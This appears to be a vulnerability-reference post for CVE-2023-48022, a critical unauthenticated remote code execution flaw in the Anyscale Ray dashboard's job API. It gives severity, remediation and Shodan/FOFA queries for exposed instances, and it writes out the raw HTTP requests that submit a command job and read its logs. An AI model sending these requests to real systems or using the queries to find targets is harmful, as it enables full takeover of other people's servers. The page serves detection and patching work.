---
layout: "post"
cve_id: "CVE-2023-48022"
title: "Anyscale Ray - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-48022.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-48022.yaml"
author: "riteshs4hu"
severity: "critical"
impact: "Unauthenticated attackers with network access to the Ray Dashboard API can execute arbitrary code remotely as root, leading to complete system compromise.
"
remediation: "Upgrade Anyscale Ray to version 2.6.4 or later, or version 2.8.1 or later, and restrict network access to the Ray Dashboard API.
"
reference:
  - "https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0"
  - "https://vulncheck.com/xdb/497d7fb3b118"
  - "https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022"
  - "https://vulncheck.com/xdb/d3bafad9c9f6"
  - "https://github.com/0x656565/CVE-2023-48022"
  - "https://nvd.nist.gov/vuln/detail/cve-2023-48022"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-48022', 'cwe-id': 'CWE-78', 'epss-score': 0.91897, 'epss-percentile': 0.99676}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'ray_project', 'product': 'ray', 'shodan-query': ['http.favicon.hash:463802404', 'http.html:"ray dashboard"'], 'fofa-query': ['icon_hash=463802404', 'body="ray dashboard"']}"
tags:
  - "cve"
  - "cve2023"
  - "rce"
  - "ray"
  - "anyscale"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Anyscale Ray 2.6.3 and 2.8.0 contain a remote code execution vulnerability due to insecure job submission API, allowing attackers to execute arbitrary code remotely if they have network access to the Ray Dashboard API.


## üåê HTTP Request
```nohighlight
POST /api/jobs/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0
Connection: close
Content-Length: 55
Content-Type: application/json
Accept-Encoding: gzip

{
  "entrypoint": "id",
  "submission_id": "04273"
}
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 4
Accept-Encoding: gzip

true
```

```nohighlight
GET /api/jobs/04273/logs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

